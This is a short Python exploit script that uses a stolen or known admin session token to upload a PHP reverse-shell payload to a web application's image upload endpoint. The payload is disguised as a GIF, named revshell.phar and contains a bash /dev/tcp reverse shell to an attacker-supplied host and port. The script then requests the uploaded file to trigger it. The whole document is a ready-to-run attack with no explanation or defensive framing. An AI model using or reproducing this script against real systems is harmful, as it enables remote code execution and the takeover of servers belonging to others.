#!/usr/bin/env python3

import requests
import traceback
import argparse
from urllib.parse import urljoin

def revShellFileUpload(target, lhost, lport, adminSession):
    """
    Upload code which executes on the server side, such as a `.phar` file.
    """
    upldImgUrl = urljoin(target, "/admin/upload_image.php")
    admin_cookies = {"PHPSESSID": f"{adminSession}"}
    headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryMn9R5DvJAXBQB8aA"}
    upldImgData = f"------WebKitFormBoundaryMn9R5DvJAXBQB8aA\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nreverse shell\r\n------WebKitFormBoundaryMn9R5DvJAXBQB8aA\r\nContent-Disposition: form-data; name=\"image\"; filename=\"revshell.phar\"\r\nContent-Type: image/gif\r\n\r\nGIF89a\r\n<?php exec('bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'); ?>\r\n------WebKitFormBoundaryMn9R5DvJAXBQB8aA--\r\n"
    try:
        upldImgRes = requests.post(upldImgUrl, headers=headers, cookies=admin_cookies, data=upldImgData, allow_redirects=False)
        if "Success" in upldImgRes.text:
            print("[+] Reverse Shell uploaded successfully")
            """
            Trigger the reverse shell
            """
            imgUrl = urljoin(target, "/images/revshell.phar")
            print(f"[+] Reverse shell triggered, check your listener {lhost}:{lport}")
            requests.get(imgUrl, cookies=admin_cookies)
        else:
            print("[-] Failed to upload the reverse shell. Response: ", upldImgRes.text)
    except Exception as e:
        print("[-] Error uploading the reverse shell file to the target machine: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="Upload code which executes on the server side in a `.phar` file")
    parser.add_argument("target", help="Target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help="Listener port")
    parser.add_argument("admin_session_token", help="Admin session token")
    args = parser.parse_args()

    revShellFileUpload(args.target, args.lhost, args.lport, args.admin_session_token)

if __name__ == "__main__":
    main()
